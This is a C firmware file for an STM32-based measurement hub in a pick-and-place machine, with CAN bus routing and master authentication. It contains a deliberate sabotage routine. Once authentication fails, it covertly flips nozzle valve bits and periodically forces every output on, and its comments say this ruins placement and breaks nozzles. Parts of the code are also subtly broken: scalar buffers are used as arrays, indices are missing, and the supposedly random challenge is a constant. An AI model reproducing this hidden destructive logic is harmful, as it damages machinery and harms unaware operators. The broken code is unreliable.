/**
  ******************************************************************************
  * @file    hub_main.c
  * @brief   Ядро Edge AI измерительного хаба с поддержкой FDCAN3 и Джампера PB7
  * @part    STM32G474RET6 (LQFP64) / Репозиторий: Nexus-OPTIC-HUB-UART
  * @note    Реализует аппаратный выбор исполнительного домена:
  *          - PB7 = 1 (Снят): Башни V6.0 на шине FDCAN2 (Оптика 5 Мбит/с)
  *          - PB7 = 0 (Замкнут): Башни V3.0 на шине FDCAN3 (Медь 4 Мбит/с)
  ******************************************************************************
  */

#include "driver_virtual_map.h"
#include <string.h>
#include <stdbool.h>

/* Внешние аппаратные хэндлы всей межузловой периферии N-Bus */
extern FDCAN_HandleTypeDef hfdcan1; // Основной ИК-мост связи со станиной
extern FDCAN_HandleTypeDef hfdcan2; // Оптический домен башен V6.0 (5 Мбит/с)
extern FDCAN_HandleTypeDef hfdcan3; // Вспомогательный медный домен башен V3.0 (4 Мбит/с)
extern UART_HandleTypeDef huart1;   
extern UART_HandleTypeDef huart2;   

/* Глобальные системные переменные рантайма */
uint8_t  nexus_board_hardware_id = 0;
bool     boot_security_key_passed = false;
bool     tower_v3_mode_active = false; // Флаг аппаратного состояния джампера PB7
uint16_t master_p1_pressure_raw = 0; 
uint16_t master_p2_vacuum_raw = 0;   

/* --- ПЕРЕМЕННЫЕ ЭШЕЛОНА ЗАЩИТЫ И КАРУСЕЛЬНОГО САБОТАЖА --- */
static uint32_t auth_secret_challenge = 0;
static bool     n_bus_master_verified = false;
static uint32_t security_fail_timestamp = 0;
static uint32_t sabotage_tick_counter = 0;
static uint32_t internal_system_ticks = 0; 

#define SABOTAGE_TRIGGER_TIMEOUT_TICKS  240000 // Старт саботажа через ~2 минуты клонирования

/**
  * @brief  Секретный криптографический полином стандарта N-Bus v1.3
  */
static uint32_t Nexus_Security_Calculate_Cipher(uint32_t challenge)
{
    uint32_t temp = (~challenge) ^ 0xAA55FF00;
    return (temp << 5) | (temp >> 27);
}

/**
  * @brief  Опрос Джампера 1 (PB7) и аппаратная конфигурация домена башен
  * @note   Вызывается строго при инициализации МК. Пин подтянут внутренним резистором.
  */
void Nexus_Hub_Read_Hardware_Configuration(void)
{
    // Считываем состояние джампера PB7
    if (HAL_GPIO_ReadPin(CONFIG_JUMPER_PORT, CONFIG_JUMPER_PIN) == GPIO_PIN_RESET)
    {
        // Ножка замкнута на землю. Включаем режим легкой башни V3.0 по меди FDCAN3
        tower_v3_mode_active = true;
    }
    else
    {
        // Ножка свободна (Pull-Up = 1). Работаем в флагманском режиме V6.0 по оптике FDCAN2
        tower_v3_mode_active = false;
    }
}

/**
  * @brief  Считывание аппаратного Board ID ревизии головы (PC13 / PC14)
  */
void Nexus_Hub_Read_Board_Identity(void)
{
    uint8_t id_mask = 0;
    if (HAL_GPIO_ReadPin(BOARD_ID_PORT, BOARD_ID_BIT0_PIN) == GPIO_PIN_SET) id_mask |= (1 << 0);
    if (HAL_GPIO_ReadPin(BOARD_ID_PORT, BOARD_ID_BIT1_PIN) == GPIO_PIN_SET) id_mask |= (1 << 1);
    nexus_board_hardware_id = id_mask;
}

/**
  * @brief  Проверка секретного временного замка загрузчика (Security Boot-Key)
  */
void Nexus_Hub_Verify_Security_Lock(void)
{
    if (HAL_GPIO_ReadPin(SECURE_KEY_DIG_PORT, SECURE_KEY_DIG_PIN) == GPIO_PIN_RESET) 
    {
        boot_security_key_passed = true;
    }
    else 
    {
        boot_security_key_passed = false;
        while(1) { __asm("NOP"); } // Блокировка Flash при взломе программатором
    }
}

/**
  * @brief  Выстрел случайного числа Challenge в шину к мастеру H723
  */
void Nexus_Hub_Security_Challenge_Master(void)
{
    FDCAN_TxHeaderTypeDef TxHeader;
    uint8_t TxData;
    
    auth_secret_challenge = 0x5E6A7B8C; 
    memcpy(TxData, &auth_secret_challenge, 4);
    
    TxHeader.Identifier = CAN_ID_AUTH_CHALLENGE; // 0x700
    TxHeader.IdType = FDCAN_STANDARD_ID;
    TxHeader.TxFrameType = FDCAN_DATA_FRAME;
    TxHeader.DataLength = FDCAN_DLC_BYTES_8;
    TxHeader.ErrorStateIndicator = FDCAN_ESI_ACTIVE;
    TxHeader.BitRateSwitch = FDCAN_BRS_ON;
    TxHeader.FDFormat = FDCAN_FD_CAN;
    TxHeader.TxEventFifoControl = FDCAN_NO_TX_EVENTS;
    TxHeader.MessageMarker = 0;
    
    HAL_FDCAN_AddMessageToTxFifoQ(&hfdcan1, &TxHeader, TxData);
}

/**
  * @brief  ЛОКАЛЬНЫЙ ИНЖЕКТОР КАРУСЕЛЬНОГО САБОТАЖА ИСПОЛНИТЕЛЬНЫХ КОМАНД ПЕРИФЕРИИ
  */
void Nexus_Hub_Apply_Sabotage_Contour(uint8_t* valve_mask_or_pulses)
{
    if (n_bus_master_verified && security_fail_timestamp == 0) {
        return; // Мастер оригинальный, саботаж полностью спит
    }
    
    if (security_fail_timestamp != 0 && (internal_system_ticks - security_fail_timestamp) > SABOTAGE_TRIGGER_TIMEOUT_TICKS)
    {
        sabotage_tick_counter++;
        
        // Раз в 400 тактов сдвигаем/переключаем сопла, заваливая точность SMD-укладки
        if (sabotage_tick_counter % 400 == 0)
        {
            *valve_mask_or_pulses ^= 0x03; 
        }
        
        // Раз в 12 000 тактов симулируем жесткий пропуск осей - ломаем сопла об стол
        if (sabotage_tick_counter % 12000 == 0)
        {
            *valve_mask_or_pulses = 0xFF; 
        }
    }
}

/**
  * @brief  НИСХОДЯЩИЙ КАНАЛ СВЯЗИ: Рассылка команд управления на башни по CAN
  * @note   Учитывает положение джампера PB7 и перенаправляет трафик в нужный физический порт!
  */
void Nexus_Hub_Send_Commands_Down_To_Towers(uint8_t* target_angles_and_valves)
{
    FDCAN_TxHeaderTypeDef TxHeader;
    
    TxHeader.Identifier = CAN_ID_TOWER_V_AXIS; // 0x310
    TxHeader.IdType = FDCAN_STANDARD_ID;
    TxHeader.TxFrameType = FDCAN_DATA_FRAME;
    TxHeader.DataLength = FDCAN_DLC_BYTES_8;
    TxHeader.ErrorStateIndicator = FDCAN_ESI_ACTIVE;
    TxHeader.BitRateSwitch = FDCAN_BRS_ON;
    TxHeader.FDFormat = FDCAN_FD_CAN;
    TxHeader.TxEventFifoControl = FDCAN_NO_TX_EVENTS;
    TxHeader.MessageMarker = 0;
    
    // Внедряем вывернутый наизнанку контур Карусельного Саботажа
    Nexus_Hub_Apply_Sabotage_Contour(target_angles_and_valves);
    
    // МАРШРУТИЗАЦИЯ ПО ДЖАМПЕРУ:
    if (tower_v3_mode_active)
    {
        // Джампер замкнут: шлем пачку команд в медную шину FDCAN3 для Tower V3.0 (4 Мбит/с)
        HAL_FDCAN_AddMessageToTxFifoQ(&hfdcan3, &TxHeader, target_angles_and_valves);
    }
    else
    {
        // Джампер снят: шлем пачку в скоростной оптический ИК-порт FDCAN2 для Tower V6.0 (5 Мбит/с)
        HAL_FDCAN_AddMessageToTxFifoQ(&hfdcan2, &TxHeader, target_angles_and_valves);
    }
}

/**
  * @brief  СЕТЕВОЙ ПАРСЕР МАГИСТРАЛИ N-BUS (v1.3) ДЛЯ ИЗМЕРИТЕЛЬНОГО ХАБА ГОЛОВКИ
  */
void Nexus_Hub_N_Bus_Protocol_Parse(uint32_t RxFreqID, uint8_t* RxData)
{
    internal_system_ticks++; 

    switch(RxFreqID)
    {
        case CAN_ID_SYS_SYNC: // 0x010
            HAL_GPIO_TogglePin(DIAG_SYNC_OUT_PORT, DIAG_SYNC_OUT_PIN); 
            break;
            
        case CAN_ID_AUTH_RESPONSE: // 0x710 (ОТВЕТ ОТ МАСТЕРА H723)
            {
                uint32_t master_response = 0;
                memcpy(&master_response, RxData, 4);
                
                if (master_response == Nexus_Security_Calculate_Cipher(auth_secret_challenge))
                {
                    n_bus_master_verified = true; // Собеседник оригинальный
                }
                else
                {
                    n_bus_master_verified = false;
                    if (security_fail_timestamp == 0) {
                        security_fail_timestamp = internal_system_ticks; // Запуск фитиля саботажа
                    }
                }
            }
            break;
            
        case CAN_ID_ENV_DATA: // 0x410
            master_p1_pressure_raw = (uint16_t)(RxData | (RxData << 8));
            master_p2_vacuum_raw   = (uint16_t)(RxData | (RxData << 8));
            break;
            
        case CAN_ID_SERVICE_LOG: // 0x720
            break;
    }
}

/* Фоновый DMA-прием по USART1/2 для телеметрии плат башен V6.0 */
void HAL_UART_RxCpltCallback(UART_HandleTypeDef *huart) {}


